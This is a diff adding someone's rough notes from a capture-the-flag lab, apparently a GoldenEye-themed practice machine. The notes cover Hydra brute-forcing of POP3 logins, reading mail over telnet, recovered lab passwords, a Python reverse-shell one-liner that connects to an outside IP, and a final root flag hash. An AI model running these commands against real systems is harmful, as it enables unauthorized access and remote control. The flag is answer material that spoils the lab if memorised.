@@ -1,0 +1,82 @@
+Date: Apr/09/2021
+Time:22:23
+
+view-source:http://10.10.146.167/terminal.js
+Boris: InvincibleHack3r
+http://10.10.146.167/sev-home/
+Qualified GoldenEye Network Operator Supervisors: 
+Natalya
+Boris
+
+└─$ hydra -l boris -P /usr/share/wordlists/rockyou.txt 10.10.146.167 -s 55007 pop3
+login:boris 
+password:secret1!
+
+$ telnet 10.10.146.167 55007
+user boris
+pass secret1!
+list
+retr 1
+retr 2
+natalya
+rete 3
+Xenia
+
+
+└─$ hydra -l natalya -P /usr/share/wordlists/rockyou.txt 10.10.146.167 -s 55007 pop3 
+login:natalya
+password:bird
+
+└─$ telnet 10.10.146.167 55007                                                                                                                      148 ⨯ 1 ⚙
+user natalya
++OK
+pass bird
++OK Logged in.
+list
++OK 2 messages:
+1 631
+2 1048
+retr 1 
+janus
+retr 2
+username: xenia
+password: RCP90rulez!
+
+http://severnaya-station.com/gnocertdir/
+login as xenia
+http://severnaya-station.com/gnocertdir/message/index.php?viewing=unread&user2=5
+My email username is...
+doak 
+
+└─$ hydra -l doak -P /usr/share/wordlists/rockyou.txt 10.10.146.167 -s 55007 pop3                                                                         1 ⚙
+login:doak
+password:goat
+
+└─$ telnet 10.10.146.167 55007                                                                                                                            2 ⚙
+do user pass list
+retr 1
+username: dr_doak
+password: 4England!
+
+http://severnaya-station.com/gnocertdir/login/index.php
+login as dr_doak
+
+http://severnaya-station.com/gnocertdir/user/files.php
+cat s3cret.txt
+Something juicy is located here: /dir007key/for-007.jpg
+
+wget http://10.10.146.167/dir007key/for-007.jpg
+└─$ exiftool for-007.jpg                                                                                                                                  2 ⚙
+└─$ echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d                                                                                                               2 ⚙
+xWinter1995x! 
+http://severnaya-station.com/gnocertdir/login/index.php
+login as admin using above pass
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.65.134",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+fuckkkkkkkkkkkkkkk thissssssssss roommmmmmmmmmmmmmmm
+final root flag is 
+568628e0d993b1973adc718237da6e93
+
+wasteddddddddddddddddddddddddddddddddddddddddddddd*******************%$$$$$$$$$$$$$#@@@@@@@@@@@@#$!@#$%%@$%$%
